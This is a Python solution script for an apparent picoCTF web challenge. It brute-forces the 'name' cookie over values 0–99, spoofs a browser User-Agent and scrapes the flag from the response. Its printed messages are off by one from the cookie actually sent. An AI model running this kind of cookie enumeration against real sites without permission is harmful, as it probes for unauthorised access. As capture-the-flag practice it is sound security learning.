#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

url = 'http://mercury.picoctf.net:17781/'
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}

print("Checking out different cookies on page " + url + " .")

for i in range(100):
    cookies = {'name': str(i)}
    response = requests.get(url, headers=headers, cookies=cookies)

    soup = BeautifulSoup(response.text,'html.parser')

    print("Setting \"name\" Cookie to " + str(i+1) + ".")
    result = str(soup.b).strip("<b></")
    if result == "Flag":
        print("Found flag with cookie " + str(i+1) + " ... exiting loop.")
        print("Here is the flag:")
        print(str(soup.code).strip("<>code/"))
        break
